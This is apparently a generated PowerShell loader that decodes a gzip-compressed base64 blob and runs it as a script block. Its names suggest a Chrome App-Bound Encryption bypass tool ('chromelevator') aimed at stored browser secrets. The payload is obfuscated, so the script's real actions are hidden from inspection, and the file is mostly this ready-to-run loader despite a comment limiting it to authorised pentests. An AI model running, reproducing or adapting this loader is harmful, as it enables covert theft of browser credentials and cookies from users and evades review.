# Genere par pack-chrome-abe-obf.ps1 — machine autorisee / mandat pentest uniquement.
param(
    [string]$Browser = 'chrome',
    [string]$ElevatorDir = '',
    [string]$OutputBase = ''
)
$ErrorActionPreference = 'Stop'
$p = @'
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
'@
function _u($x) {
    $a = New-Object IO.MemoryStream(,[Convert]::FromBase64String($x))
    $z = New-Object IO.Compression.GzipStream($a, [IO.Compression.CompressionMode]::Decompress)
    $b = New-Object IO.MemoryStream
    $z.CopyTo($b)
    [Text.Encoding]::UTF8.GetString($b.ToArray())
}
$sb = [Management.Automation.ScriptBlock]::Create((_u $p))
$__ld = Split-Path -Parent $MyInvocation.MyCommand.Path
$__lab = Join-Path $__ld '..\lab\chromelevator\extracted'
$pp = @{}
foreach ($k in $PSBoundParameters.Keys) { $pp[$k] = $PSBoundParameters[$k] }
if ((-not $pp.ContainsKey('ElevatorDir')) -or [string]::IsNullOrWhiteSpace($pp['ElevatorDir'])) {
    if (Test-Path -LiteralPath $__lab) { $pp['ElevatorDir'] = (Resolve-Path -LiteralPath $__lab).Path }
}
& $sb @pp